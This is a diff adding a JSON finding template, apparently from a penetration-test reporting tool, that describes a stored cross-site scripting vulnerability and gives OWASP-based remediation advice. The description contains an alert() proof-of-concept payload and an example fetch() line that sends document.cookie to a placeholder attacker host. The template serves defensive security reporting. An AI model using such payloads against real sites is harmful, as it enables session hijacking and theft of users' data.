@@ -1,0 +1,41 @@
+﻿{
+    "id":  "255f7b33-3cfa-40a6-b662-b2cc262e5eea",
+    "created":  "2026-09-16T17:16:54.922091Z",
+    "updated":  "2026-10-23T16:53:15.816380Z",
+    "details":  "http://localhost:8000/api/v1/findingtemplates/255f7b33-3cfa-40a6-b662-b2cc262e5eea",
+    "images":  "http://localhost:8000/api/v1/findingtemplates/255f7b33-3cfa-40a6-b662-b2cc262e5eea/images",
+    "usage_count":  0,
+    "source":  "imported",
+    "tags":  [
+                 "web"
+             ],
+    "translations":  [
+                         {
+                             "id":  "e17d7b69-ef40-4dee-a0ed-2ec770148831",
+                             "created":  "2026-09-16T17:16:54.923782Z",
+                             "updated":  "2026-09-16T17:16:54.925344Z",
+                             "language":  "en-US",
+                             "status":  "finished",
+                             "is_main":  true,
+                             "risk_score":  7.2,
+                             "risk_level":  "high",
+                             "data":  {
+                                          "title":  "Stored Cross-Site Scripting (XSS)",
+                                          "cvss":  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N",
+                                          "summary":  "At the time of testing, the web application stored user input unchecked and later included it in HTTP responses in an insecure manner. \nIt was thus vulnerable to stored cross-site scripting (XSS) attacks.  \nExploitation of Stored XSS vulnerabilities does not require user interaction, making them more dangerous than Reflected XSS vulnerabilities.\n",
+                                          "description":  "We were able to identify a stored XSS vulnerability in the web application during testing. \nDue to incorrect validation and encoding of data, we were able to inject malicious scripts into the web application and store them persistently.\n\nThe parameter `\u003cPARAMETER_NAME\u003e` in `\u003cURL\u003e` is stored by the application and rendered on `\u003cOUTPUT_URL\u003e` without output encoding. We submitted the following payload and confirmed that the script executed each time the page was loaded, including by a second user account:\n\n```html\n\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n```\n\nBecause the payload persists server-side, a victim only has to open the affected page. No crafted link is needed. In the context of the victim\u0027s session, injected JavaScript can read the DOM, send authenticated requests, and exfiltrate data to an attacker-controlled host, for example `fetch(\u0027https://\u003cATTACKER_HOST\u003e/?c=\u0027+document.cookie)`. Session cookies without the `HttpOnly` flag are directly readable. When a privileged user views the page, the script can also perform administrative actions.\n\nCross-site scripting (XSS) is a common web security vulnerability where malicious scripts can be injected into web applications due to insufficient validation or encoding of data. \nIn XSS attacks, attackers embed JavaScript code in the content delivered by the vulnerable web application.\n\nThe goal in stored XSS attacks is to place script code on pages visited by other users. \nSimply visiting the affected subpage is enough for the script code to be executed in the victim\u0027s web browser. \n\nFor an attack, malicious scripts are injected into the web application by the attacker and stored and included in subsequent HTTP responses of the application. \nThe malicious script is ultimately executed in the victim\u0027s web browser and can potentially access cookies, session tokens or other sensitive information. \n\nIf the attack is successful, an attacker gains control over web application functions and data in the victim\u0027s context. \nIf the affected user has privileged access, an attacker may be able to gain complete control over the web application.\n",
+                                          "recommendation":  "* Ensure that all processed data is filtered as rigorously as possible. Filtering and validation should be done based on expected and valid inputs.\n* Data should be encoded before the web application includes it in HTTP responses. Encoding should be done contextually, that is, depending on where the web application inserts data in the HTML document, the appropriate encoding syntax must be considered.\n* The HTTP headers `Content-Type` (e.g. `text/plain`) and `X-Content-Type-Options: nosniff` can be set for HTTP responses that do not contain HTML and JavaScript. \n* We recommend to additionally use a Content Security Policy (CSP) to control which client-side scripts are allowed and which are forbidden.\n* Detailed information and help on preventing XSS can be found in the linked Cross-Site Scripting Prevention Cheat Sheet from OWASP.\n",
+                                          "short_recommendation":  "User input should be validated and filtered based on expected or valid input. It should be ensured that data is properly encoded contextually before it is included in HTTP responses.",
+                                          "references":  [
+                                                             "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"
+                                                         ],
+                                          "affected_components":  [
+                                                                      "\u003cURL\u003e - parameter: \u003cPARAMETER_NAME\u003e"
+                                                                  ],
+                                          "cwe":  "CWE-79"
+                                      }
+                         }
+                     ],
+    "lock_info":  null,
+    "copy_of":  null
+}
